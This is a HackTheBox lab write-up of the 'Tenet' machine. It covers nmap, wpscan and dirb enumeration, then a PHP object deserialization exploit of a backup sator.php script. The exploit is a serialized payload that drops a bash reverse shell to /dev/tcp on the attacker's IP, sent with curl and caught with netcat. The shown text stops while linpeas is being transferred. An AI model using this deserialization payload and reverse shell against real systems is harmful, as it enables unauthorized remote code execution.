---
layout: post
title: "Tenet Writeup - HackTheBox"
category: HackTheBox
---

## HTB - Tenet
Welcome back again, new day new box. Lets do a Linux box again, Tenet is a medium box. Which is currently in the release labs.

### ENUM
Lets enumerate this target:

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# nmap -A 10.129.71.67 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 08:50 EST
Nmap scan report for 10.129.71.67
Host is up (0.011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=34924%PV=Y%DS=2%DC=T%G=Y%TM=602D1F5
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   10.66 ms 10.10.14.1
2   10.92 ms 10.129.71.67

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.18 seconds

```

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# nmap -sS -sV --script=vuln 10.129.71.67 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 08:51 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.71.67
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	1337DAY-ID-32009	0.0	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-10081	5.0	https://vulners.com/cve/CVE-2019-10081
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.72 seconds

```
Did I see wordpress???? I am going to scan for some wordpress, and do some dirbuster as well since HTTP server.

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# wpscan --url http://10.129.71.67/wordpress | tee wpscan.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.129.71.67/wordpress/ [10.129.71.67]
[+] Started: Wed Feb 17 08:57:05 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.129.71.67/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.129.71.67/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.129.71.67/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.129.71.67/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.129.71.67/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.6'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.129.71.67/wordpress/, Match: 'WordPress 5.6'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups -: |=========================================================================================|

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb 17 08:57:07 2021
[+] Requests Done: 24
[+] Cached Requests: 27
[+] Data Sent: 6.51 KB
[+] Data Received: 4.035 KB
[+] Memory used: 220.391 MB
[+] Elapsed time: 00:00:01

```

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# dirb http://10.129.71.67 | tee dirb.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 17 08:55:34 2021
URL_BASE: http://10.129.71.67/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.71.67/ ----
+ http://10.129.71.67/index.html (CODE:200|SIZE:10918)                                                                
+ http://10.129.71.67/server-status (CODE:403|SIZE:277)                                                               
==> DIRECTORY: http://10.129.71.67/wordpress/                                                                         
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/ ----
+ http://10.129.71.67/wordpress/index.php (CODE:301|SIZE:0)                                                           
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/                                                                
==> DIRECTORY: http://10.129.71.67/wordpress/wp-content/                                                              
==> DIRECTORY: http://10.129.71.67/wordpress/wp-includes/                                                             
+ http://10.129.71.67/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                         
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/ ----
+ http://10.129.71.67/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                  
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/css/                                                            
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/images/                                                         
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/includes/                                                       
+ http://10.129.71.67/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                  
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/js/                                                             
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/maint/                                                          
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/network/                                                        
==> DIRECTORY: http://10.129.71.67/wordpress/wp-admin/user/                                                           
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-content/ ----
+ http://10.129.71.67/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                
==> DIRECTORY: http://10.129.71.67/wordpress/wp-content/plugins/                                                      
==> DIRECTORY: http://10.129.71.67/wordpress/wp-content/themes/                                                       
==> DIRECTORY: http://10.129.71.67/wordpress/wp-content/uploads/                                                      
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/network/ ----
+ http://10.129.71.67/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                          
+ http://10.129.71.67/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                          
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-admin/user/ ----
+ http://10.129.71.67/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                             
+ http://10.129.71.67/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                             
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-content/plugins/ ----
+ http://10.129.71.67/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                        
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-content/themes/ ----
+ http://10.129.71.67/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                         
                                                                                                                      
---- Entering directory: http://10.129.71.67/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 17 09:02:43 2021
DOWNLOADED: 36896 - FOUND: 13

```

### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion
- I also tried to utilize searchsploit, a tool that basicly is a CLI version of exploitDB.
- And I used the exploits that I got from nmap during enum

#### OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
- EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
- EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
- SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
- PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
- MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
- EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
- https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
- EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
- 1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
- EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
- PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
- EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
- 1337DAY-ID-32009	0.0	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
- 1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*


#### Apache httpd 2.4.29 ((Ubuntu))
- EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
- 1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
- EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
- 1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
- EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
- 1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
- PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
- EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
- 1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
- 1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
- 1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
- 1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
- 1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*

### Exploitation galore 🔥

I started with wordpress. After I did dirbuster and WP scan I some some directories redirecting to tenet.htb. So the scriptkiddie I am I edited a file called /etc/hosts:

```
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.198    buff
10.129.71.67    tenet   tenet.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Now the webpage resolves to tenet.htb, and made me run dirbuster and wpscan again, but now for tenet.htb.

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# wpscan --url http://tenet.htb | tee wpscan2.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://tenet.htb/ [10.129.71.67]
[+] Started: Wed Feb 17 11:17:23 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tenet.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://tenet.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tenet.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://tenet.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://tenet.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://tenet.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2020-12-22T00:00:00.000Z
 | Readme: http://tenet.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.1
 | Style URL: http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups -: |=================================================================================================================================================================================================================|

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb 17 11:17:27 2021
[+] Requests Done: 53
[+] Cached Requests: 5
[+] Data Sent: 12.567 KB
[+] Data Received: 347.724 KB
[+] Memory used: 201.836 MB
[+] Elapsed time: 00:00:03

```
When I added the tenet.htb domain to my hosts it fixed the wordpress site. I stumbled upon a comment from a user called neil on the post called migration:
`did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!`

After that I went on a WitchHunt for sator.php or backup files. Thats when I found the following URL's:
```
http://10.129.71.67/users.txt
10.129.71.67/sator.php.bak
10.129.71.67/sator.php
```
.bak files are backups of original files. And the only backupfile I found contained the following information:

```
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file,
$this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```
Here we see that the script looks for a GET input variable arepo and unserializes it. We might be able to exploit it using PHP Object Deserialization. Here is a blogpost on this topic that has a detail explanation.

Here is a class called DatabaseExport with a __destruct function implemented. This function is what we can use to get RCE. The function uses file_put_contents to write the variable data to the file defined in the variable user_file. If we go over to the URI sator.tenet.htb/users.txt, we see that the file exists and prints SUCCESS.

Now, to exploit this, we can do the following:
- We write the class DatabaseExport on our local machine, define user_file to be a php file and the data to be a php reverse shell to our local machine.
- We serialize our defined class and pass it as input to the GET variable variable.
- The input gets passed to deserialize and a new instance of the class is created with our defined variables.
- At the __destruct function, our reverse shell gets written to the root of the web directory to the filename defined by us(rce.php in my case). Now if we go to the URI of the file, we can get a reverse shell.

So now, we write the class, serilize it and urlencode it to pass to the GET variable. We open a php interactive cli using
```
php -a
```
we write the following:
```
class DatabaseExport {
  public $user_file = 'rce.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.35/5555 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));
```
The output that is printed is the payload, in my case: 
```
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.35%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```


Now we can transfer the payload toward the server with the following command:
```
curl -i http://10.129.71.67/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.35%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```
Start a netcat listener for port 5555 on your host machine:
```
nc -lvp 5555
```
Browse towards http://10.129.71.67/rce.php and go back to you listener (maybe retry once or twice):
```
root@kali:/home/kali/Desktop/HTB/machines/tenet# nc -lvp 5555
listening on [any] 5555 ...
ls
connect to [10.10.14.35] from tenet [10.129.71.67] 27904
index.html
rce.php
sator.php
sator.php.bak
users.txt
wordpress
whoami
www-data

```

Download linpeas on your host and transfer it to tenet via simplehttpserver:

```
root@kali:/home/kali/Desktop/HTB/machines/tenet# wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
--2021-02-17 13:59:35--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325272 (318K) [text/plain]
Saving to: ‘linpeas.sh’

linpeas.sh                    100%[================================================>] 317.65K  --.-KB/s    in 0.01s   

2021-02-17 13:59:35 (23.1 MB/s) - ‘linpeas.sh’ saved [325272/325272]

root@kali:/home/kali/Desktop/HTB/machines/tenet# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
